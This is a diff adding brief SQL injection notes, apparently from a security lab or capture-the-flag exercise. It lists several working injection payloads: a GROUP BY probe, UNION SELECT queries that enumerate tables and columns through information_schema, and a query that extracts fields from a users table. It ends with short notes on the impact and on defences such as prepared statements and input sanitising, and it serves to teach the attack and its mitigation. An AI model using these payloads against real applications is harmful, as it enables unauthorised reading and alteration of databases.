@@ -1,0 +1,18 @@
+1 group by 2
+0 or 1=1 UNION select null,table_name FROM information_Schema.tables where table_schema=database()
+0 UNION SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME=0x7573657273 --
+0 union select Commentaire,countersign from users where user_id=5
+
+
+
+
+
+what for : read sensitive data from the database,
+modify database data (Insert/Update/Delete)
+
+
+to be protected: use of prepared statements (with parameterized queries).
+
+sanitize user inputs.
+
+escaping all user supplied input.
